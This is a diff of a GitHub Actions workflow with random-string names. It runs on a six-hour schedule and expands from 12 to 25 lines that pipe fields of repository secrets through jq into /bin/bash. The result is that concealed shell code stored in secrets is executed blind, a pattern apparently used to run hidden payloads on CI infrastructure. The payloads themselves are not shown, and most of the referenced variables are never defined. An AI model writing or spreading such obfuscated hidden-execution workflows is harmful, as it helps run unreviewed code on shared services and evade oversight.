@@ -3,26 +3,40 @@ name: luyizi7654
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 0/6 * * *'
-jobs:  # 26012
+    - cron: '42 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: luyizi7654
         env:
-          fibip7: ${{ secrets.fibip7 }}
+          pj18266: ${{ secrets.pj18266 }}
         run: |
-          echo $fibip7 | jq -r .p90256 | /bin/bash
-          echo $dkkjy002 | jq -r .zf51 | /bin/bash
-          echo $pzq4 | jq -r .i961 | /bin/bash
-          echo $xsu05246 | jq -r .w63758 | /bin/bash
-          echo $yikv2303 | jq -r .i27 | /bin/bash
-          echo $dcybb0 | jq -r .dny49 | /bin/bash
-          echo $z8 | jq -r .hki32269 | /bin/bash
-          echo $pq837 | jq -r .uwdt06532 | /bin/bash
-          echo $xxnej03 | jq -r .wsf94664 | /bin/bash
-          echo $jzt84 | jq -r .t606 | /bin/bash
-          echo $chde9 | jq -r .lidr22805 | /bin/bash
-          echo $vmea2 | jq -r .afyh30675 | /bin/bash
+          echo $pj18266 | jq -r .awaj033 | /bin/bash
+          echo $bck51669 | jq -r .g271 | /bin/bash
+          echo $x84 | jq -r .y0 | /bin/bash
+          echo $f09 | jq -r .jq1 | /bin/bash
+          echo $kmc3 | jq -r .wyydc780 | /bin/bash
+          echo $nlgtn2498 | jq -r .kp080 | /bin/bash
+          echo $nbgu73 | jq -r .kq221 | /bin/bash
+          echo $rczt80257 | jq -r .kck561 | /bin/bash
+          echo $oo710 | jq -r .evu80346 | /bin/bash
+          echo $kzxp58 | jq -r .e05484 | /bin/bash
+          echo $vvy74 | jq -r .yvq45157 | /bin/bash
+          echo $odw16 | jq -r .fnm06 | /bin/bash
+          echo $iqmi11 | jq -r .smas4370 | /bin/bash
+          echo $m60563 | jq -r .e1 | /bin/bash
+          echo $qxdyh1770 | jq -r .ehno42886 | /bin/bash
+          echo $qwy88 | jq -r .ktkeo8957 | /bin/bash
+          echo $lqty92919 | jq -r .eeqfo93984 | /bin/bash
+          echo $mcgd6 | jq -r .m19 | /bin/bash
+          echo $wpu859 | jq -r .o36876 | /bin/bash
+          echo $owpi0 | jq -r .hvan8245 | /bin/bash
+          echo $x75 | jq -r .t732 | /bin/bash
+          echo $za1 | jq -r .e513 | /bin/bash
+          echo $sg86196 | jq -r .nor2495 | /bin/bash
+          echo $kaecv7036 | jq -r .mlgay67752 | /bin/bash
+          echo $fg30 | jq -r .gor81 | /bin/bash
 
